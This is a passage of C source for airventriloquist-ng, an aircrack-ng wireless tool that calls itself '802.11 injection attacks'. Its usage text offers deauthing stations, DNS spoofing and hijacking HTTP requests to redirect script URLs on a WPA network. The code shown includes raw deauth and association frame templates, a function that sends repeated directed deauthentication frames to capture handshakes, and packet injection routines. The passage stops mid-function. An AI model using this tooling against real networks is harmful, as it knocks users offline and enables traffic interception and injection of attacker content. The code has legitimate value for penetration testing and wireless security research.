/*
 *  802.11 injection attacks
 *
 *  Copyright (C) 2015 Tim de Waal
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 *
 *  In addition, as a special exception, the copyright holders give
 *  permission to link the code of portions of this program with the
 *  OpenSSL library under certain conditions as described in each
 *  individual source file, and distribute linked combinations
 *  including the two.
 *  You must obey the GNU General Public License in all respects
 *  for all of the code used other than OpenSSL. *  If you modify
 *  file(s) with this exception, you may extend this exception to your
 *  version of the file(s), but you are not obligated to do so. *  If you
 *  do not wish to do so, delete this exception statement from your
 *  version. *  If you delete this exception statement from all source
 *  files in the program, then also delete it here.
 */

#if defined(linux)
    #include <linux/rtc.h>
#endif

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/time.h>

#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <dirent.h>
#include <signal.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <time.h>
#include <getopt.h>

#include <fcntl.h>
#include <ctype.h>

#include <limits.h>

#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

#include <fnmatch.h>
#include <stdbool.h>

#include "version.h"
#include "pcap.h"
#include "osdep/osdep.h"
#include "crypto.h"
#include "common.h"
#include "ieee80211.h"
#include "osdep/radiotap/radiotap_iter.h"
#include "airventriloquist-ng.h"

#define RTC_RESOLUTION  8192

#define REQUESTS    30
#define MAX_APS     20

#define NEW_IV  1
#define RETRY   2
#define ABORT   3

#define DEAUTH_REQ      \
    "\xC0\x00\x3A\x01\xCC\xCC\xCC\xCC\xCC\xCC\xBB\xBB\xBB\xBB\xBB\xBB" \
    "\xBB\xBB\xBB\xBB\xBB\xBB\x00\x00\x07\x00"

#define AUTH_REQ        \
    "\xB0\x00\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC" \
    "\xBB\xBB\xBB\xBB\xBB\xBB\xB0\x00\x00\x00\x01\x00\x00\x00"

#define ASSOC_REQ       \
    "\x00\x00\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"  \
    "\xBB\xBB\xBB\xBB\xBB\xBB\xC0\x00\x31\x04\x64\x00"

#define REASSOC_REQ       \
    "\x20\x00\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"  \
    "\xBB\xBB\xBB\xBB\xBB\xBB\xC0\x00\x31\x04\x64\x00\x00\x00\x00\x00\x00\x00"

#define NULL_DATA       \
    "\x48\x01\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"  \
    "\xBB\xBB\xBB\xBB\xBB\xBB\xE0\x1B"

#define RTS             \
    "\xB4\x00\x4E\x04\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"

#define RATES           \
    "\x01\x04\x02\x04\x0B\x16\x32\x08\x0C\x12\x18\x24\x30\x48\x60\x6C"

#define PROBE_REQ       \
    "\x40\x00\x00\x00\xFF\xFF\xFF\xFF\xFF\xFF\xCC\xCC\xCC\xCC\xCC\xCC"  \
    "\xFF\xFF\xFF\xFF\xFF\xFF\x00\x00"

#define RATE_NUM 12

#define RATE_1M 1000000
#define RATE_2M 2000000
#define RATE_5_5M 5500000
#define RATE_11M 11000000

#define RATE_6M 6000000
#define RATE_9M 9000000
#define RATE_12M 12000000
#define RATE_18M 18000000
#define RATE_24M 24000000
#define RATE_36M 36000000
#define RATE_48M 48000000
#define RATE_54M 54000000

int bitrates[RATE_NUM]={RATE_1M, RATE_2M, RATE_5_5M, RATE_6M, RATE_9M, RATE_11M, RATE_12M, RATE_18M, RATE_24M, RATE_36M, RATE_48M, RATE_54M};

extern char * getVersion(char * progname, int maj, int min, int submin, int svnrev, int beta, int rc);
extern int maccmp(u_int8_t *mac1, u_int8_t *mac2);
extern u_int8_t * getmac(char * macAddress, int strict, u_int8_t * mac);
extern int check_crc_buf( u_int8_t *buf, int len );
extern const unsigned long int crc_tbl[256];
extern const u_int8_t crc_chop_tbl[256][4];

char * progname = NULL;

char usage[] =
"\n"
"  %s - (C) 2015 Tim de Waal\n"
"  https://www.aircrack-ng.org\n"
"\n"
"  usage: airventriloquist-ng [options]\n"
"\n"
"      -i <replay interface>   : Interface to listen and inject on\n"
"      -d | --deauth           : Send active deauths to encrypted stations\n"
"      -e | --essid <value>    : ESSID of target network \n"
"      -p | --passphrase <val> : WPA Passphrase of target network\n"
"      -c | --icmp             : Respond to all ICMP frames (Debug)\n"
"      -n | --dns              : IP to resolve all DNS queries to\n"
"      -s | --hijack <URL>     : URL to look for in HTTP requests\n"
"                                <URL> can have wildcards\n"
"                                   eg: *jquery*.js*\n"
"      -r | --redirect <URL>   : URL to redirect to\n"
"      -v | --verbose          : Verbose output\n"
"      --help                  : This super helpful message\n"
"\n"
"\n";

struct options
{
    u_int8_t f_bssid[6];
    u_int8_t f_dmac[6];
    u_int8_t f_smac[6];
    int f_minlen;
    int32_t f_maxlen;
    int f_type;
    int f_subtype;
    int f_tods;
    int f_fromds;
    int f_iswep;

    int r_nbpps;
    u_int8_t r_bssid[6];
    u_int8_t r_dmac[6];
    u_int8_t r_smac[6];
    u_int8_t r_dip[4];
    u_int8_t r_sip[4];
    char r_essid[33];
    char r_smac_set;

    char ip_out[16];    //16 for 15 chars + \x00
    char ip_in[16];
    int port_out;
    int port_in;

    char *iface_out;
    char *s_face;
    char *s_file;
    uint8_t *prga;

    int a_mode;
    int a_count;
    int a_delay;
    int f_retry;

    int prgalen;

    int delay;
    int npackets;


    int ignore_negative_one;
    int rtc;

    int reassoc;
    char flag_icmp_resp;
    char flag_http_hijack;
    char flag_dnsspoof;
    char deauth;
    char flag_verbose;
    char *p_redir_url;
    char *p_redir_pkt_str;
    char *p_hijack_str;
    unsigned long p_dnsspoof_ip;

    // Copied from airdecap
    int decap_no_convert;
    char essid[36];
    char passphrase[65];
    u_int8_t decap_bssid[6];
    u_int8_t pmk[40];
    u_int8_t decap_wepkey[64];
    int decap_weplen, crypt;
    int decap_store_bad;

    struct WPA_ST_info *st_1st;
    struct WPA_ST_info *st_cur;
    struct WPA_ST_info *st_prv;
} opt;

struct devices
{
    int fd_in,  arptype_in;
    int fd_out, arptype_out;
    int fd_rtc;

    u_int8_t mac_in[6];
    u_int8_t mac_out[6];

    int is_wlanng;
    int is_hostap;
    int is_madwifi;
    int is_madwifing;
    int is_bcm43xx;

    FILE *f_cap_in;

    struct pcap_file_header pfh_in;
} dev;

static struct wif *_wi_in, *_wi_out;

struct ARP_req
{
    u_int8_t *buf;
    int hdrlen;
    int len;
};

struct APt
{
    u_int8_t set;
    u_int8_t found;
    u_int8_t len;
    u_int8_t essid[255];
    u_int8_t bssid[6];
    u_int8_t chan;
    unsigned int  ping[REQUESTS];
    int  pwr[REQUESTS];
};

struct APt ap[MAX_APS];

unsigned long nb_pkt_sent;
u_int8_t h80211[4096];
u_int8_t tmpbuf[4096];
u_int8_t srcbuf[4096];
char strbuf[512];

int ctrl_c, alarmed;

char * iwpriv;


void sighandler( int signum )
{
    if( signum == SIGINT )
        ctrl_c++;

    if( signum == SIGALRM )
        alarmed++;
}

int reset_ifaces()
{
    //close interfaces
    if(_wi_in != _wi_out)
    {
        if(_wi_in)
        {
            wi_close(_wi_in);
            _wi_in = NULL;
        }
        if(_wi_out)
        {
            wi_close(_wi_out);
            _wi_out = NULL;
        }
    }
    else
    {
        if(_wi_out)
        {
            wi_close(_wi_out);
            _wi_out = NULL;
            _wi_in = NULL;
        }
    }

    /* open the replay interface */
    _wi_out = wi_open(opt.iface_out);
    if (!_wi_out)
        return 1;
    dev.fd_out = wi_fd(_wi_out);

    /* open the packet source */
    if( opt.s_face != NULL )
    {
        _wi_in = wi_open(opt.s_face);
        if (!_wi_in)
            return 1;
        dev.fd_in = wi_fd(_wi_in);
        wi_get_mac(_wi_in, dev.mac_in);
    }
    else
    {
        _wi_in = _wi_out;
        dev.fd_in = dev.fd_out;

        /* XXX */
        dev.arptype_in = dev.arptype_out;
        wi_get_mac(_wi_in, dev.mac_in);
    }

    wi_get_mac(_wi_out, dev.mac_out);

    return 0;
}

int set_bitrate(struct wif *wi, int rate)
{
    int i, newrate;

    if( wi_set_rate(wi, rate) )
        return 1;

//    if( reset_ifaces() )
//        return 1;

    //Workaround for buggy drivers (rt73) that do not accept 5.5M, but 5M instead
    if (rate == 5500000 && wi_get_rate(wi) != 5500000) {
    if( wi_set_rate(wi, 5000000) )
        return 1;
    }

    newrate = wi_get_rate(wi);
    for(i=0; i<RATE_NUM; i++)
    {
        if(bitrates[i] == rate)
            break;
    }
    if(i==RATE_NUM)
        i=-1;
    if( newrate != rate )
    {
        if(i!=-1)
        {
            if( i>0 )
            {
                if(bitrates[i-1] >= newrate)
                {
                    printf("Couldn't set rate to %.1fMBit. (%.1fMBit instead)\n", (rate/1000000.0), (wi_get_rate(wi)/1000000.0));
                    return 1;
                }
            }
            if( i<RATE_NUM-1 )
            {
                if(bitrates[i+1] <= newrate)
                {
                    printf("Couldn't set rate to %.1fMBit. (%.1fMBit instead)\n", (rate/1000000.0), (wi_get_rate(wi)/1000000.0));
                    return 1;
                }
            }
            return 0;
        }
        printf("Couldn't set rate to %.1fMBit. (%.1fMBit instead)\n", (rate/1000000.0), (wi_get_rate(wi)/1000000.0));
        return 1;
    }
    return 0;
}

uint32_t calc_fcs(const uint8_t *buf, uint32_t len)
{
  uint i;
  uint32_t crc32 = 0xFFFFFFFF; //Seed
 
  for (i = 0; i < len; i++)
  crc32 = crc32_ccitt_table[(crc32 ^ buf[i]) & 0xff] ^ (crc32 >> 8);
 
  return ( ~crc32 );
}


int send_packet(void *buf, u_int32_t count)
{
    struct wif *wi = _wi_out; /* XXX globals suck */
    u_int8_t *pkt = (u_int8_t*) buf;


    //setting sequence numbers... Don' want to do this for our purposes...
    // One main reason for this is because IF this is an encrypted frame
    // then the sequence number is used in the encryption, so changing it here
    // will break it. It won't be able to be decrypted...
    /*
    if( (count > 24) && (pkt[1] & 0x04) == 0 && (pkt[22] & 0x0F) == 0)
    {
        pkt[22] = (nb_pkt_sent & 0x0000000F) << 4;
        pkt[23] = (nb_pkt_sent & 0x00000FF0) >> 4;
    }
    */

    if( (count > 24) )
    {
        //Set the duration...
        pkt[2] = 0x3A;
        pkt[3] = 0x01;
        
        //Reset Retry Flag
        pkt[1] = pkt[1] & ~0x4;
    }

    if (wi_write(wi, buf, count, NULL) == -1) {
        switch (errno) {
        case EAGAIN:
        case ENOBUFS:
            printf("Hey, ENOBUFS happened\n");
            usleep(10000);
            return 0; /* XXX not sure I like this... -sorbo */
        }

        perror("wi_write()");
        return -1;
    }

    nb_pkt_sent++;
    return 0;
}

int read_packet(void *buf, u_int32_t count, struct rx_info *ri)
{
    struct wif *wi = _wi_in; /* XXX */
    int rc;

        rc = wi_read(wi, buf, count, ri);
        if (rc == -1) {
            switch (errno) {
            case EAGAIN:
                    return 0;
            }

            perror("wi_read()");
            return -1;
        }

    return rc;
}

void read_sleep( int usec )
{
    struct timeval tv, tv2, tv3;
    int caplen;
    fd_set rfds;

    gettimeofday(&tv, NULL);
    gettimeofday(&tv2, NULL);

    tv3.tv_sec=0;
    tv3.tv_usec=10000;

    while( ((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) < (usec) )
    {
        FD_ZERO( &rfds );
        FD_SET( dev.fd_in, &rfds );

        if( select( dev.fd_in + 1, &rfds, NULL, NULL, &tv3 ) < 0 )
        {
            continue;
        }

        if( FD_ISSET( dev.fd_in, &rfds ) )
            caplen = read_packet( h80211, sizeof( h80211 ), NULL );

        gettimeofday(&tv2, NULL);
    }
}

/*
int filter_packet( u_int8_t *h80211, int caplen )
{
    int z, mi_b, mi_s, mi_d, ext=0, qos;

    if(caplen <= 0)
        return( 1 );

    z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;
    if ( ( h80211[0] & 0x80 ) == 0x80 )
    {
        qos = 1; // 802.11e QoS 
        z+=2;
    }

    if( (h80211[0] & 0x0C) == 0x08)    //if data packet
        ext = z-24; //how many bytes longer than default ieee80211 header

    // check length 
    if( caplen-ext < opt.f_minlen ||
        caplen-ext > opt.f_maxlen ) return( 1 );

    // check the frame control bytes

    if( ( h80211[0] & 0x0C ) != ( opt.f_type    << 2 ) &&
        opt.f_type    >= 0 ) return( 1 );

    if( ( h80211[0] & 0x70 ) != (( opt.f_subtype << 4 ) & 0x70) && //ignore the leading bit (QoS)
        opt.f_subtype >= 0 ) return( 1 );

    if( ( h80211[1] & 0x01 ) != ( opt.f_tods         ) &&
        opt.f_tods    >= 0 ) return( 1 );

    if( ( h80211[1] & 0x02 ) != ( opt.f_fromds  << 1 ) &&
        opt.f_fromds  >= 0 ) return( 1 );

    if( ( h80211[1] & 0x40 ) != ( opt.f_iswep   << 6 ) &&
        opt.f_iswep   >= 0 ) return( 1 );

    // check the extended IV (TKIP) flag 

    if( opt.f_type == 2 && opt.f_iswep == 1 &&
        ( h80211[z + 3] & 0x20 ) != 0 ) return( 1 );

    // MAC address checking 

    switch( h80211[1] & 3 )
    {
        case  0: mi_b = 16; mi_s = 10; mi_d =  4; break;
        case  1: mi_b =  4; mi_s = 10; mi_d = 16; break;
        case  2: mi_b = 10; mi_s = 16; mi_d =  4; break;
        default: mi_b = 10; mi_d = 16; mi_s = 24; break;
    }

    if( memcmp( opt.f_bssid, NULL_MAC, 6 ) != 0 )
        if( memcmp( h80211 + mi_b, opt.f_bssid, 6 ) != 0 )
            return( 1 );

    if( memcmp( opt.f_smac,  NULL_MAC, 6 ) != 0 )
        if( memcmp( h80211 + mi_s,  opt.f_smac,  6 ) != 0 )
            return( 1 );

    if( memcmp( opt.f_dmac,  NULL_MAC, 6 ) != 0 )
        if( memcmp( h80211 + mi_d,  opt.f_dmac,  6 ) != 0 )
            return( 1 );

    // this one looks good 

    return( 0 );
}
*/

int wait_for_beacon(uint8_t *bssid, uint8_t *capa, char *essid)
{
    int len = 0, chan = 0, taglen = 0, tagtype = 0, pos = 0;
    uint8_t pkt_sniff[4096];
    struct timeval tv,tv2;
    char essid2[33];

    gettimeofday(&tv, NULL);
    while (1)
    {
        len = 0;
        while (len < 22)
        {
            len = read_packet(pkt_sniff, sizeof(pkt_sniff), NULL);

            gettimeofday(&tv2, NULL);
            if(((tv2.tv_sec-tv.tv_sec)*1000000) + (tv2.tv_usec-tv.tv_usec) > 10000*1000) //wait 10sec for beacon frame
            {
                return -1;
            }
            if(len <= 0) usleep(1);
        }
        if (! memcmp(pkt_sniff, "\x80", 1))
        {
            pos = 0;
            taglen = 22;    //initial value to get the fixed tags parsing started
            taglen+= 12;    //skip fixed tags in frames
            do
            {
                pos    += taglen + 2;
                tagtype = pkt_sniff[pos];
                taglen  = pkt_sniff[pos+1];
            } while(tagtype != 3 && pos < len-2);

            if(tagtype != 3) continue;
            if(taglen != 1) continue;
            if(pos+2+taglen > len) continue;

            chan = pkt_sniff[pos+2];

            if(essid)
            {
                pos = 0;
                taglen = 22;    //initial value to get the fixed tags parsing started
                taglen+= 12;    //skip fixed tags in frames
                do
                {
                    pos    += taglen + 2;
                    tagtype = pkt_sniff[pos];
                    taglen  = pkt_sniff[pos+1];
                } while(tagtype != 0 && pos < len-2);

                if(tagtype != 0) continue;
                if(taglen <= 1)
                {
                    if (memcmp(bssid, pkt_sniff+10, 6) == 0) break;
                    else continue;
                }
                if(pos+2+taglen > len) continue;

                if(taglen > 32)taglen = 32;

                if((pkt_sniff+pos+2)[0] < 32 && memcmp(bssid, pkt_sniff+10, 6) == 0)
                {
                    break;
                }

                /* if bssid is given, copy essid */
                if(bssid != NULL && memcmp(bssid, pkt_sniff+10, 6) == 0 && strlen(essid) == 0)
                {
                    memset(essid, 0, 33);
                    memcpy(essid, pkt_sniff+pos+2, taglen);
                    break;
                }

                /* if essid is given, copy bssid AND essid, so we can handle case insensitive arguments */
                if(bssid != NULL && memcmp(bssid, NULL_MAC, 6) == 0 && strncasecmp(essid, (char*)pkt_sniff+pos+2, taglen) == 0 && strlen(essid) == (unsigned)taglen)
                {
                    memset(essid, 0, 33);
                    memcpy(essid, pkt_sniff+pos+2, taglen);
                    memcpy(bssid, pkt_sniff+10, 6);
                    printf("Found BSSID \"%02X:%02X:%02X:%02X:%02X:%02X\" to given ESSID \"%s\".\n", bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], essid);
                    break;
                }

                /* if essid and bssid are given, check both */
                if(bssid != NULL && memcmp(bssid, pkt_sniff+10, 6) == 0 && strlen(essid) > 0)
                {
                    memset(essid2, 0, 33);
                    memcpy(essid2, pkt_sniff+pos+2, taglen);
                    if(strncasecmp(essid, essid2, taglen) == 0 && strlen(essid) == (unsigned)taglen)
                        break;
                    else
                    {
                        printf("For the given BSSID \"%02X:%02X:%02X:%02X:%02X:%02X\", there is an ESSID mismatch!\n", bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
                        printf("Found ESSID \"%s\" vs. specified ESSID \"%s\"\n", essid2, essid);
                        printf("Using the given one, double check it to be sure its correct!\n");
                        break;
                    }
                }
            }
        }
    }

    if(capa) memcpy(capa, pkt_sniff+34, 2);

    return chan;
}

/**
    if bssid != NULL its looking for a beacon frame
*/
int attack_check(uint8_t* bssid, char* essid, uint8_t* capa, struct wif *wi)
{
    int ap_chan=0, iface_chan=0;

    iface_chan = wi_get_channel(wi);

    if(iface_chan == -1 && !opt.ignore_negative_one)
    {
        PCT; printf("Couldn't determine current channel for %s, you should either force the operation with --ignore-negative-one or apply a kernel patch\n",
                wi_get_ifname(wi));
        return -1;
    }

    if(bssid != NULL)
    {
        ap_chan = wait_for_beacon(bssid, capa, essid);
        if(ap_chan < 0)
        {
            PCT; printf("No such BSSID available.\n");
            return -1;
        }
        if((ap_chan != iface_chan) && (iface_chan != -1 || !opt.ignore_negative_one))
        {
            PCT; printf("%s is on channel %d, but the AP uses channel %d\n", wi_get_ifname(wi), iface_chan, ap_chan);
            return -1;
        }
    }

    return 0;
}

int getnet( uint8_t* capa, int filter, int force)
{
    u_int8_t *bssid;

    if(filter)
        bssid = opt.f_bssid;
    else
        bssid = opt.r_bssid;


    if( memcmp(bssid, NULL_MAC, 6) )
    {
        PCT; printf("Waiting for beacon frame (BSSID: %02X:%02X:%02X:%02X:%02X:%02X) on channel %d\n",
                    bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],wi_get_channel(_wi_in));
    }
    else if(strlen(opt.r_essid) > 0)
    {
        PCT; printf("Waiting for beacon frame (ESSID: %s) on channel %d\n", opt.r_essid,wi_get_channel(_wi_in));
    }
    else if(force)
    {
        PCT;
        if(filter)
        {
            printf("Please specify at least a BSSID (-b) or an ESSID (-e)\n");
        }
        else
        {
            printf("Please specify at least a BSSID (-a) or an ESSID (-e)\n");
        }
        return( 1 );
    }
    else
        return 0;

    if( attack_check(bssid, opt.r_essid, capa, _wi_in) != 0)
    {
        if(memcmp(bssid, NULL_MAC, 6))
        {
            if( strlen(opt.r_essid) == 0 || opt.r_essid[0] < 32)
            {
                printf( "Please specify an ESSID (-e).\n" );
            }
        }

        if(!memcmp(bssid, NULL_MAC, 6))
        {
            if(strlen(opt.r_essid) > 0)
            {
                printf( "Please specify a BSSID (-a).\n" );
            }
        }
        return( 1 );
    }

    return 0;
}

static int get_ip_port(char *iface, char *ip, const int ip_size)
{
    char *host;
    char *ptr;
    int port = -1;
    struct in_addr addr;

    host = strdup(iface);
    if (!host)
        return -1;

    ptr = strchr(host, ':');
    if (!ptr)
        goto out;

    *ptr++ = 0;

    if (!inet_aton(host, (struct in_addr *)&addr))
        goto out; /* XXX resolve hostname */

    if(strlen(host) > 15)
        {
            port = -1;
            goto out;
        }
    strncpy(ip, host, ip_size);
    port = atoi(ptr);
        if(port <= 0) port = -1;

out:
    free(host);
    return port;
}

int tcp_test(const char* ip_str, const short port)
{
    int sock, i;
    struct sockaddr_in s_in;
    int packetsize = 1024;
    u_int8_t packet[packetsize];
    struct timeval tv, tv2, tv3;
    int caplen = 0;
    int times[REQUESTS];
    int min, avg, max, len;
    struct net_hdr nh;

    tv3.tv_sec=0;
    tv3.tv_usec=1;

    memset(&s_in, 0, sizeof(struct sockaddr_in));
    s_in.sin_family = PF_INET;
    s_in.sin_port = htons(port);
    if (!inet_aton(ip_str, &s_in.sin_addr))
            return -1;

    if ((sock = socket(s_in.sin_family, SOCK_STREAM, IPPROTO_TCP)) == -1)
            return -1;

    /* avoid blocking on reading the socket */
    if( fcntl( sock, F_SETFL, O_NONBLOCK ) < 0 )
    {
        perror( "fcntl(O_NONBLOCK) failed" );
        close(sock);
        return( 1 );
    }

    gettimeofday( &tv, NULL );

    while (1)  //waiting for relayed packet
    {
        if (connect(sock, (struct sockaddr*) &s_in, sizeof(s_in)) == -1)
        {
            if(errno != EINPROGRESS && errno != EALREADY)
            {
                perror("connect");
                close(sock);

                printf("Failed to connect\n");

                return -1;
            }
        }
        else
        {
            gettimeofday( &tv2, NULL );
            break;
        }

        gettimeofday( &tv2, NULL );
        //wait 3000ms for a successful connect
        if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (3000*1000))
        {
            printf("Connection timed out\n");
            close(sock);
            return(-1);
        }
        usleep(10);
    }

    PCT; printf("TCP connection successful\n");

    //trying to identify airserv-ng
    memset(&nh, 0, sizeof(nh));
//     command: GET_CHAN
    nh.nh_type  = 2;
    nh.nh_len   = htonl(0);

    if (send(sock, &nh, sizeof(nh), 0) != sizeof(nh))
    {
        perror("send");
        close(sock);
        return -1;
    }

    gettimeofday( &tv, NULL );
    i=0;

    while (1)  //waiting for GET_CHAN answer
    {
        caplen = read(sock, &nh, sizeof(nh));

        if(caplen == -1)
        {
            if( errno != EAGAIN )
            {
                perror("read");
                close(sock);
                return -1;
            }
        }

        if( (unsigned)caplen == sizeof(nh))
        {
            len = ntohl(nh.nh_len);
            if( nh.nh_type == 1 && i==0 )
            {
                i=1;
                caplen = read(sock, packet, len);
                if(caplen == len)
                {
                    i=2;
                    break;
                }
                else
                {
                    i=0;
                }
            }
            else
            {
                caplen = read(sock, packet, len);
            }
        }

        gettimeofday( &tv2, NULL );
        //wait 1000ms(1sec) for an answer
        if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (1000*1000))
        {
            break;
        }
        if(caplen == -1)
            usleep(10);
    }

    if(i==2)
    {
        PCT; printf("airserv-ng found\n");
    }
    else
    {
        PCT; printf("airserv-ng NOT found\n");
    }

    close(sock);

    for(i=0; i<REQUESTS; i++)
    {
        if ((sock = socket(s_in.sin_family, SOCK_STREAM, IPPROTO_TCP)) == -1)
                return -1;

        /* avoid blocking on reading the socket */
        if( fcntl( sock, F_SETFL, O_NONBLOCK ) < 0 )
        {
            perror( "fcntl(O_NONBLOCK) failed" );
            close(sock);
            return( 1 );
        }

        usleep(1000);

        gettimeofday( &tv, NULL );

        while (1)  //waiting for relayed packet
        {
            if (connect(sock, (struct sockaddr*) &s_in, sizeof(s_in)) == -1)
            {
                if(errno != EINPROGRESS && errno != EALREADY)
                {
                    perror("connect");
                    close(sock);

                    printf("Failed to connect\n");

                    return -1;
                }
            }
            else
            {
                gettimeofday( &tv2, NULL );
                break;
            }

            gettimeofday( &tv2, NULL );
            //wait 1000ms for a successful connect
            if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (1000*1000))
            {
                break;
            }
            //simple "high-precision" usleep
            select(1, NULL, NULL, NULL, &tv3);
        }
        times[i] = ((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec));
        printf( "\r%d/%d\r", i, REQUESTS);
        fflush(stdout);
        close(sock);
    }

    min = INT_MAX;
    avg = 0;
    max = 0;

    for(i=0; i<REQUESTS; i++)
    {
        if(times[i] < min) min = times[i];
        if(times[i] > max) max = times[i];
        avg += times[i];
    }
    avg /= REQUESTS;

    PCT; printf("ping %s:%d (min/avg/max): %.3fms/%.3fms/%.3fms\n", ip_str, port, min/1000.0, avg/1000.0, max/1000.0);

    return 0;
}



//TODO: this function is hacked together, It should be cleaned up
// Need to use wfrm (ieee80211_frame struct instead of just a buffer)
int deauth_station( struct WPA_ST_info *st_cur )
{
    if( memcmp( st_cur->stmac, NULL_MAC, 6 ) != 0 )
    {
        /* deauthenticate the target */

        memcpy( h80211, DEAUTH_REQ, 26 );
        memcpy( h80211 + 16, st_cur->bssid, 6 );

        int i;
        for( i = 0; i < 5; i++ )
        {
            PCT; printf( "Sending 5 directed DeAuth. STMAC:"
                        " [%02X:%02X:%02X:%02X:%02X:%02X] \r",
                        st_cur->stmac[0],  st_cur->stmac[1],
                        st_cur->stmac[2],  st_cur->stmac[3],
                        st_cur->stmac[4],  st_cur->stmac[5]
                        );

            memcpy( h80211 +  4, st_cur->stmac,  6 );
            memcpy( h80211 + 10, st_cur->bssid, 6 );

            if( send_packet( h80211, 26 ) < 0 )
                return( 1 );

            //usleep(2000);
            
            //Send deauth to the AP...
            memcpy( h80211 +  4, st_cur->bssid, 6 );
            memcpy( h80211 + 10, st_cur->stmac,  6 );

            if( send_packet( h80211, 26 ) < 0 )
                return( 1 );
            //Usually this is where we would wait for an ACK, but we need to get back
            // to capturing packets to get the EAPOL 4 way handshake
        }
        return (0);
    }

    return( 0 );
}


//Shameless copy from tshark/wireshark?
void hexDump (char* desc, void *addr, int len) {
    int i;
    u_int8_t buff[17];
    u_int8_t *pc = (u_int8_t*)addr;

    // Output description if given.
    if (desc != NULL)
        printf ("%s:\n", desc);

    // Process every byte in the data.
    for (i = 0; i < len; i++) {
        // Multiple of 16 means new line (with line offset).
        if ((i % 16) == 0) {
            // Just don't print ASCII for the zeroth line.
            if (i != 0)
                printf ("  %s\n", buff);

            // Output the offset in Hex.
            printf ("  %04x ", i);
        }

        // Now the hex code for the specific character.
        printf (" %02x", pc[i]);

        // And store a printable ASCII character for later.
        if ((pc[i] < 0x20) || (pc[i] > 0x7e))
            buff[i % 16] = '.';
        else
            buff[i % 16] = pc[i];
        buff[(i % 16) + 1] = '\0';
    }

    // Pad out last line if not exactly 16 characters.
    while ((i % 16) != 0) {
        printf ("   ");
        i++;
    }

    // And print the final ASCII bit.
    printf ("  %s\n", buff);
    return;
}

/* calcsum - used to calculate IP and ICMP header checksums using
 * one's compliment of the one's compliment sum of 16 bit words of the header
 */
u_int16_t calcsum(u_int16_t *buffer, u_int32_t length)
{
    u_int32_t sum;  

    // initialize sum to zero and loop until length (in words) is 0 
    for (sum=0; length>1; length-=2) // sizeof() returns number of bytes, we're interested in number of words 
        sum += *buffer++;   // add 1 word of buffer to sum and proceed to the next 

    // we may have an extra byte 
    if (length==1)
        sum += (u_int8_t)*buffer;

    sum = (sum >> 16) + (sum & 0xFFFF);  // add high 16 to low 16 
    sum += (sum >> 16);          // add carry 
    return ~sum;
}
//This needs to be cleaned up so that we can do UDP/TCP in one function. Don't want to do that now and risk
// breaking UDP checksums right now
u_int16_t calcsum_tcp(u_int16_t *buf, u_int32_t len, u_int32_t src_addr, u_int32_t dest_addr)
{
        u_int32_t chksum;
        u_int32_t length=len;
        u_int16_t *ip_src=(u_int16_t *)&src_addr;
        u_int16_t *ip_dst=(u_int16_t *)&dest_addr;

        // Calculate the chksum
        chksum = 0;
        while (len > 1)
        {
                chksum += *buf++;
                if (chksum & 0x80000000)
                    chksum = (chksum & 0xFFFF) + (chksum >> 16);
                len -= 2;
        }

        if ( len & 1 )
            // Add the padding if the packet length is odd         
            chksum += *((u_int8_t *)buf);


        // Add the pseudo-header                                        
        chksum += *(ip_src++);
        chksum += *ip_src;

        chksum += *(ip_dst++);
        chksum += *ip_dst;

        chksum += htons(IPPROTO_TCP);
        chksum += htons(length);

        while (chksum >> 16)
                chksum = (chksum & 0xFFFF) + (chksum >> 16);

        // Return the one's complement of chksum                          
        return ((u_int16_t)(~chksum));
}

u_int16_t calcsum_udp(u_int16_t *buf, u_int32_t len, u_int32_t src_addr, u_int32_t dest_addr)
{
        u_int32_t chksum;
        u_int32_t length=len;
        u_int16_t *ip_src=(u_int16_t *)&src_addr;
        u_int16_t *ip_dst=(u_int16_t *)&dest_addr;

        // Calculate the chksum
        chksum = 0;
        while (len > 1)
        {
                chksum += *buf++;
                if (chksum & 0x80000000)
                        chksum = (chksum & 0xFFFF) + (chksum >> 16);
                len -= 2;
        }

        if ( len & 1 )
                // Add the padding if the packet length is odd         
                chksum += *((u_int8_t *)buf);


        // Add the pseudo-header                                        
        chksum += *(ip_src++);
        chksum += *ip_src;

        chksum += *(ip_dst++);
        chksum += *ip_dst;

        chksum += htons(IPPROTO_UDP);
        chksum += htons(length);

        while (chksum >> 16)
                chksum = (chksum & 0xFFFF) + (chksum >> 16);

        // Return the one's complement of chksum                          
        return ( (u_int16_t)(~chksum)  );
}

static inline u_int8_t* packet_get_sta_80211( u_int8_t* pkt )
{
